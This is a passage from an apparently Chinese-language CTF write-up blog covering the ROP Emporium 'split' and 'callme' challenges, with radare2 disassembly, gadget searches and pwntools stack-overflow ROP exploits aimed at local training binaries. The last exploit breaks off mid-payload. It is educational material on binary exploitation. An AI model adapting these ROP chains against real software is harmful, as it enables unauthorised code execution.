flag.txt</span><br></pre></td></tr></table></figure>

<p>可以我们所需的字符串在最后一项，其虚拟地址为：<code>0x0804a030</code></p>
<p>我们构造ROP链所需的东西都找齐了，现在我们可以构造payload了，完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./split32&#x27;</span>)</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = p32(0x80483e0)</span></span><br><span class="line">system_addr = p32(e.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">bin_cat_addr = p32(<span class="number">0x0804a030</span>)</span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span> + system_addr + p32(<span class="number">1</span>) + bin_cat_addr </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/image-20230313160454083.png" alt="image-20230313160454083"></p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>与x86类似，但需要注意的是在64位环境下，函数参数的传递方式发生了变化，前六个参数改为了由寄存器传递，此处我们还需要找一个gadget来传递字符串参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./split --only <span class="string">&quot;pop|ret&quot;</span> | grep rdi</span></span><br><span class="line">0x00000000004007c3 : pop rdi ; ret</span><br></pre></td></tr></table></figure>

<p>其余函数地址跟字符串地址的查找方式同上，不再赘述。</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_addr = p64(0x400560)</span></span><br><span class="line">system_addr = p64(e.plt[<span class="string">&quot;system&quot;</span>]) <span class="comment">#get system address</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = p64(<span class="number">0x00000000004007c3</span>)</span><br><span class="line"></span><br><span class="line">bin_cat_addr = p64(<span class="number">0x0000000000601060</span>)</span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span>  + pop_rdi_addr + bin_cat_addr + system_addr </span><br><span class="line"><span class="comment">#Note the difference of 32bit and 64bit</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ROP_Emporium</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Challenge3_callme</title>
    <url>/2023/03/15/ROP_Emporium/Challenge3-callme/</url>
    <content><![CDATA[<h1 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h1><p>题目链接：<a href="https://ropemporium.com/challenge/callme.html">https://ropemporium.com/challenge/callme.html</a></p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>根据提示可以知道，这次需要我们构造一个连续调用函数的ROP链。我们需要注意在32位环境下<code>pop 3ret</code>这种情况，来进行堆栈平衡。提示中告诉我们要依次调用<code>call_one()</code>，<code>call_two()</code>，<code>call_three()</code>这三个函数，每一个函数的参数均为<code>0xdeadbeef, 0xcafebabe, 0xd00df00d</code>，eg.<code>call_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)</code>我们需要构造一个依次调用这三个函数的ROP链。</p>
<span id="more"></span>

<p>首先，照例查看保护情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec ./callme32</span> </span><br><span class="line">[*]&#x27;/home/giantbranch/Desktop/rop_emporium_all_challenges/level3_callme/32/callme32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RUNPATH:  &#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>这里看别人的write up都关注了一下PIE，暂时先不管，以后再回来说。</p>
<p>题目给了<code>.so</code>文件，使用<code>ldd</code>查看下依赖库：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ldd ./callme32</span> </span><br><span class="line">	linux-gate.so.1 =&gt;  (0xf7fb4000)</span><br><span class="line">	libcallme32.so =&gt; ./libcallme32.so (0xf7fad000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7ddc000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7fb6000)</span><br></pre></td></tr></table></figure>

<p>确实用到了提供的库（废话，这不是肯定的嘛）</p>
<p>接下来我们看下用到了程序里的函数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A ./callme32</span> </span><br><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x08048570    1     50 entry0</span><br><span class="line">0x080485a3    1      4 fcn.080485a3</span><br><span class="line">0x08048520    1      6 sym.imp.__libc_start_main</span><br><span class="line">0x0804848c    3     35 sym._init</span><br><span class="line">0x080485c0    1      4 sym.__x86.get_pc_thunk.bx</span><br><span class="line">0x08048560    1      6 sym..plt.got</span><br><span class="line">0x08048804    1     20 sym._fini</span><br><span class="line">0x080485d0    4     41 sym.deregister_tm_clones</span><br><span class="line">0x08048610    4     54 sym.register_tm_clones</span><br><span class="line">0x08048650    3     31 sym.__do_global_dtors_aux</span><br><span class="line">0x08048680    1      6 sym.frame_dummy</span><br><span class="line">0x080486ed    1     98 sym.pwnme</span><br><span class="line">0x08048540    1      6 sym.imp.memset</span><br><span class="line">0x08048500    1      6 sym.imp.puts</span><br><span class="line">0x080484d0    1      6 sym.imp.printf</span><br><span class="line">0x080484c0    1      6 sym.imp.read</span><br><span class="line">0x0804874f    1     67 sym.usefulFunction</span><br><span class="line">0x080484e0    1      6 sym.imp.callme_three</span><br><span class="line">0x08048550    1      6 sym.imp.callme_two</span><br><span class="line">0x080484f0    1      6 sym.imp.callme_one</span><br><span class="line">0x08048510    1      6 sym.imp.exit</span><br><span class="line">0x08048800    1      2 sym.__libc_csu_fini</span><br><span class="line">0x080487a0    4     93 sym.__libc_csu_init</span><br><span class="line">0x080485b0    1      2 sym._dl_relocate_static_pie</span><br><span class="line">0x08048686    1    103 main</span><br><span class="line">0x08048530    1      6 sym.imp.setvbuf</span><br></pre></td></tr></table></figure>

<p>其中带有<code>imp</code>的（即imports）就是从外部导入的函数，也可以通过<code>ii</code>命令或者<code>rabin2 -i ./callme</code>来查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">[0x08048570]&gt; </span><span class="language-bash">ii</span></span><br><span class="line">[Imports]</span><br><span class="line">nth vaddr      bind   type   lib name</span><br><span class="line">―――――――――――――――――――――――――――――――――――――</span><br><span class="line">1   0x080484c0 GLOBAL FUNC       read</span><br><span class="line">2   0x080484d0 GLOBAL FUNC       printf</span><br><span class="line">3   0x080484e0 GLOBAL FUNC       callme_three</span><br><span class="line">4   0x080484f0 GLOBAL FUNC       callme_one</span><br><span class="line">5   0x08048500 GLOBAL FUNC       puts</span><br><span class="line">6   0x00000560 WEAK   NOTYPE     __gmon_start__</span><br><span class="line">7   0x08048510 GLOBAL FUNC       exit</span><br><span class="line">8   0x08048520 GLOBAL FUNC       __libc_start_main</span><br><span class="line">9   0x08048530 GLOBAL FUNC       setvbuf</span><br><span class="line">10  0x08048540 GLOBAL FUNC       memset</span><br><span class="line">11  0x08048550 GLOBAL FUNC       callme_two</span><br></pre></td></tr></table></figure>

<p>可以看到<code>callme_one</code>，<code>callme_two</code>，<code>callme_three</code>都是外部导入，其实也就是<code>libcallme32.so</code>中的函数。</p>
<hr>
<p>其实我们不用具体看这三个函数是干什么的，也可以做。这里我们在<code>libcallme32.so</code>中查看这三个函数的功能。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">r2 -A libcallme32.so</span></span><br><span class="line"><span class="meta prompt_">[0x00000540]&gt; </span><span class="language-bash">afl</span></span><br><span class="line">0x00000540    1      4 entry0</span><br><span class="line">0x00000755   11    256 sym.callme_two</span><br><span class="line">0x00000510    1      6 sym.imp.fopen</span><br><span class="line">0x000004f0    1      6 sym.imp.puts</span><br><span class="line">0x00000500    1      6 sym.imp.exit</span><br><span class="line">0x00000520    1      6 sym.imp.fgetc</span><br><span class="line">0x00000484    3     35 sym._init</span><br><span class="line">0x00000538    1      6 fcn.00000538</span><br><span class="line">0x000009ec    1     20 sym._fini</span><br><span class="line">0x00000855   10    406 sym.callme_three</span><br><span class="line">0x0000063d   10    280 sym.callme_one</span><br><span class="line">0x000004e0    1      6 sym.imp.malloc</span><br><span class="line">0x000004c0    1      6 sym.imp.fgets</span><br><span class="line">0x000004d0    1      6 sym.imp.fclose</span><br><span class="line">0x00000550    4     53 sym.deregister_tm_clones</span><br><span class="line">0x00000639    1      4 sym.__x86.get_pc_thunk.dx</span><br><span class="line">0x00000590    4     71 sym.register_tm_clones</span><br><span class="line">0x000005e0    5     71 sym.__do_global_dtors_aux</span><br><span class="line">0x00000530    1      6 sym..plt.got</span><br><span class="line">0x00000630    1      9 sym.frame_dummy</span><br><span class="line">0x00000000    8    332 loc.imp._ITM_deregisterTMCloneTable</span><br></pre></td></tr></table></figure>

<p>从中我们也能看到<code>callme_one</code>，<code>callme_two</code>，<code>callme_three</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x00000540</span>]&gt; s sym.callme_one </span><br><span class="line">[<span class="number">0x0000063d</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_4h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.callme_one(<span class="type">int32_t</span> arg_8h, <span class="type">int32_t</span> arg_ch, <span class="type">int32_t</span> arg_10h)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int32_t</span> iVar1;</span><br><span class="line">    uint uVar2;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    uint stream;</span><br><span class="line">    uint var_4h;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    <span class="keyword">if</span> (((arg_8h != <span class="number">-0x21524111</span>) || (arg_ch != <span class="number">-0x35014542</span>)) || (arg_10h != <span class="number">-0x2ff20ff3</span>)) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x429</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    iVar1 = sym.imp.fopen(unaff_EBX + <span class="number">0x3b9</span>, unaff_EBX + <span class="number">0x3b7</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x3cf</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = sym.imp.<span class="built_in">malloc</span>(<span class="number">0x21</span>);</span><br><span class="line">    *(unaff_EBX + <span class="number">0x19e7</span>) = uVar2;</span><br><span class="line">    <span class="keyword">if</span> (*(unaff_EBX + <span class="number">0x19e7</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x3f1</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    uVar2 = sym.imp.fgets(*(unaff_EBX + <span class="number">0x19e7</span>), <span class="number">0x21</span>, iVar1);</span><br><span class="line">    *(unaff_EBX + <span class="number">0x19e7</span>) = uVar2;</span><br><span class="line">    sym.imp.fclose(iVar1);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x40b</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x0000063d</span>]&gt; s sym.callme_two </span><br><span class="line">[<span class="number">0x00000755</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="comment">// WARNING: Variable defined which should be unmapped: var_8h</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.callme_two(<span class="type">int32_t</span> arg_8h, <span class="type">int32_t</span> arg_ch, <span class="type">int32_t</span> arg_10h)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> uVar1;</span><br><span class="line">    <span class="type">int32_t</span> iVar2;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> var_10h;</span><br><span class="line">    uint stream;</span><br><span class="line">    uint var_8h;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    <span class="keyword">if</span> (((arg_8h == <span class="number">-0x21524111</span>) &amp;&amp; (arg_ch == <span class="number">-0x35014542</span>)) &amp;&amp; (arg_10h == <span class="number">-0x2ff20ff3</span>)) &#123;</span><br><span class="line">        iVar2 = sym.imp.fopen(unaff_EBX + <span class="number">0x325</span>, unaff_EBX + <span class="number">0x29e</span>);</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">            sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x32e</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">            sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (var_10h = <span class="number">0</span>; var_10h &lt; <span class="number">0x10</span>; var_10h = var_10h + <span class="number">1</span>) &#123;</span><br><span class="line">            uVar1 = sym.imp.fgetc(iVar2);</span><br><span class="line">            *(var_10h + *(unaff_EBX + <span class="number">0x18ce</span>)) = uVar1 ^ *(var_10h + *(unaff_EBX + <span class="number">0x18ce</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x346</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x310</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x00000755</span>]&gt; s sym.callme_three </span><br><span class="line">[<span class="number">0x00000855</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.callme_three <span class="title function_">noreturn</span> <span class="params">(<span class="type">int32_t</span> arg_8h, <span class="type">int32_t</span> arg_ch, <span class="type">int32_t</span> arg_10h)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint8_t</span> uVar1;</span><br><span class="line">    <span class="type">int32_t</span> iVar2;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> var_10h;</span><br><span class="line">    uint stream;</span><br><span class="line">    </span><br><span class="line">    entry0();</span><br><span class="line">    <span class="keyword">if</span> (((arg_8h == <span class="number">-0x21524111</span>) &amp;&amp; (arg_ch == <span class="number">-0x35014542</span>)) &amp;&amp; (arg_10h == <span class="number">-0x2ff20ff3</span>)) &#123;</span><br><span class="line">        iVar2 = sym.imp.fopen(unaff_EBX + <span class="number">0x264</span>, unaff_EBX + <span class="number">0x19e</span>);</span><br><span class="line">        <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">            sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x26d</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">            sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (var_10h = <span class="number">0x10</span>; var_10h &lt; <span class="number">0x20</span>; var_10h = var_10h + <span class="number">1</span>) &#123;</span><br><span class="line">            uVar1 = sym.imp.fgetc(iVar2);</span><br><span class="line">            *(var_10h + *(unaff_EBX + <span class="number">0x17ce</span>)) = uVar1 ^ *(var_10h + *(unaff_EBX + <span class="number">0x17ce</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">4</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">4</span>) ^ <span class="number">0xdeadbeef</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">8</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">8</span>) ^ <span class="number">0xdeadbeef</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0xc</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0xc</span>) ^ <span class="number">0xcafebabe</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x10</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x10</span>) ^ <span class="number">0xcafebabe</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x14</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x14</span>) ^ <span class="number">0xd00df00d</span>;</span><br><span class="line">        *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x18</span>) = *(*(unaff_EBX + <span class="number">0x17ce</span>) + <span class="number">0x18</span>) ^ <span class="number">0xd00df00d</span>;</span><br><span class="line">        sym.imp.<span class="built_in">puts</span>(*(unaff_EBX + <span class="number">0x17ce</span>));</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">        sym.imp.<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(unaff_EBX + <span class="number">0x210</span>);</span><br><span class="line">    <span class="comment">// WARNING: Subroutine does not return</span></span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据反编译得到的伪码，可以大致推断出这三个函数的功能</p>
<p><code>callme_one</code>：读取加密的flag；<code>callme_two</code>：解密0-15，前16个字节；<code>callme_three</code>：解密16-31，后16个字节。</p>
<p>通过<code>xxd</code>也可以看到加密后的flag确实是32字节</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">xxd encrypted_flag.dat</span> </span><br><span class="line">00000000: 534d 5341 91d9 f5a6 8ad5 c5b7 dbdb 9dbe  SMSA............</span><br><span class="line">00000010: cada b2ed 2a84 63bc 71b5 70a0 7c79 3e5d  ....*.c.q.p.|y&gt;]</span><br></pre></td></tr></table></figure>

<hr>
<p>查看<code>pwnme</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x08048570</span>]&gt; s sym.pwnme</span><br><span class="line">[<span class="number">0x080486ed</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.pwnme(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    uint s;</span><br><span class="line">    </span><br><span class="line">    sym.imp.<span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">    sym.imp.<span class="built_in">printf</span>(<span class="number">0x804886b</span>);</span><br><span class="line">    sym.imp.read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>);</span><br><span class="line">    sym.imp.<span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显可以看到<code>read</code>函数处存在栈溢出，偏移量计算得为44。</p>
<p>我还在看下<code>usefulFunction</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[<span class="number">0x080486ed</span>]&gt; s sym.usefulFunction </span><br><span class="line">[<span class="number">0x0804874f</span>]&gt; pdg</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> sym.usefulFunction(<span class="type">void</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int32_t</span> unaff_EBX;</span><br><span class="line">    <span class="type">int32_t</span> iVar1;</span><br><span class="line">    uint uVar2;</span><br><span class="line">    uint uVar3;</span><br><span class="line">    uint uStack16;</span><br><span class="line">    </span><br><span class="line">    sym.imp.callme_three(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    sym.imp.callme_two(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    uVar3 = <span class="number">6</span>;</span><br><span class="line">    uVar2 = <span class="number">5</span>;</span><br><span class="line">    sym.imp.callme_one(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">    sym.imp.<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    sym.__x86.get_pc_thunk.bx();</span><br><span class="line">    sym._init();</span><br><span class="line">    iVar1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        (**(unaff_EBX + <span class="number">0x1753</span> + iVar1 * <span class="number">4</span>))(uVar2, uVar3, uStack16);</span><br><span class="line">        iVar1 = iVar1 + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (iVar1 != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到函数内部调用了<code>callme_one</code>，<code>callme_two</code>，<code>callme_three</code>这三个函数，但是它的调用顺序跟提示的顺序刚好反过来了，所以，并不能直接覆盖返回地址到<code>usefulFunction</code>函数，看起来也不是那么的useful，还是需要我们手动构建ROP链。</p>
<p>需要注意的是，在32位环境下，多次调用libc里的带有多个参数的函数，我们需要使用<code>pop3 ret</code>方法。</p>
<p>举个栗子！</p>
<p>假设我们要连续调用<code>read(fd1,buf1,size1)</code>和<code>write(fd2,buf2,size2)</code>两个函数调用，就不能按照平常的方式布置ROP，即直接将<code>write</code>函数的地址覆盖到预留返回地址处，这样的话，两个函数的参数会发生重叠，如图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pwn%E5%AD%A6%E4%B9%A0.drawio.png" alt="pwn学习.drawio"></p>
<p>所以我们要通过能够移动<code>esp</code>指针的gadgets来消除<code>read</code>函数的参数，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">add esp 8 ; pop ebx ; ret</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<p>我们把上述描述的类似第一行的3个<code>pop</code>指令的gadgets统称为<code>pop3 ret</code>，即移动<code>esp</code>指针消去三个参数，再返回执行后续的函数，如图所示：</p>
<p><img src="https://guoxb.oss-cn-qingdao.aliyuncs.com/typora-imgs/pop3ret.png" alt="pop3ret"></p>
<p>通过上图所示的ROP布局，我们就能实现连续调用<code>read</code>和<code>write</code>函数，<code>pop3 ret</code>可以在<code>read/write</code>函数返回时，清理栈上的参数，进而触发下一次调用。</p>
<blockquote>
<p>2个参数的libc函数可以使用<code>pop2 ret</code></p>
<p>1个参数的libc函数可以使用<code>pop ret</code></p>
</blockquote>
<p>更多具体内容参考<a href="https://blog.csdn.net/kelxLZ/article/details/111830630?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-111830630-blog-122399319.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-111830630-blog-122399319.pc_relevant_recovery_v2&utm_relevant_index=4">这篇博客</a>。</p>
<p>再回到我们这道题中，我们需要连续三次调用<code>callme_one</code>，<code>callme_two</code> <code>callme_three</code>这三个函数，每个函数都有三个参数，所以我们需要找到<code>pop3 ret</code>这种类型的gadgets</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary callme32 --only <span class="string">&quot;pop|ret&quot;</span></span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080487fb : pop ebp ; ret</span><br><span class="line">0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484ad : pop ebx ; ret</span><br><span class="line">0x080487fa : pop edi ; pop ebp ; ret</span><br><span class="line">0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048496 : ret</span><br><span class="line">0x0804861e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>

<p>可以看到地址<code>0x080487f9</code>处的gadgets满足要求。其实也可以使用<code>add esp</code>这种类型的gadgets，只要能够移动<code>esp</code>指针消去栈上的参数都可以。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">rop --grep <span class="string">&quot;add esp&quot;</span></span></span><br><span class="line">0x080484a8 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span><br><span class="line">0x080485f2 : add esp, 0x10 ; leave ; ret</span><br><span class="line">0x08048749 : add esp, 0x10 ; nop ; leave ; ret</span><br><span class="line">0x080487f5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080484aa : add esp, 8 ; pop ebx ; ret</span><br><span class="line">0x080487f3 : jne 0x80487e1 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080485ed : mov al, byte ptr [0xd0ff0804] ; add esp, 0x10 ; leave ; ret</span><br><span class="line">0x0804863a : mov al, byte ptr [0xd2ff0804] ; add esp, 0x10 ; leave ; ret</span><br><span class="line">0x080484a6 : mov dh, 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span><br><span class="line">0x08048810 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret</span><br></pre></td></tr></table></figure>

<p>可以看到<code>0x080484aa</code>地址处的gadgets也能移动<code>esp</code>指针，并且刚好消去三个参数。</p>
<p>完整的exploit代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./callme32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme_addr = p32(e.symbols[<span class="string">&quot;pwnme&quot;</span>])</span><br><span class="line">callme_one = p32(e.plt[<span class="string">&quot;callme_one&quot;</span>])</span><br><span class="line">callme_two = p32(e.plt[<span class="string">&quot;callme_two&quot;</span>])</span><br><span class="line">callme_three = p32(e.plt[<span class="string">&quot;callme_three&quot;</span>])</span><br><span class="line"></span><br><span class="line">arg1 = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">arg2 = p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">arg3 = p32(<span class="number">0xd00df00d</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">add_esp = p32(<span class="number">0x080484aa</span>)<span class="comment"># add esp, 8 ; pop ebx ; ret </span></span><br><span class="line"><span class="comment">#stack balance ; clear three args of call_x function</span></span><br><span class="line">add_esp = p32(<span class="number">0x080487f9</span>)<span class="comment"># pop3 ret: pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"></span><br><span class="line">payload = offset*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+= callme_one</span><br><span class="line">payload+= add_esp</span><br><span class="line">payload+= arg1+arg2+arg3</span><br><span class="line">payload+= callme_two</span><br><span class="line">payload+= add_esp</span><br><span class="line">payload+= arg1+arg2+arg3</span><br><span class="line">payload+= callme_three</span><br><span class="line">payload+= add_esp</span><br><span class="line">payload+= 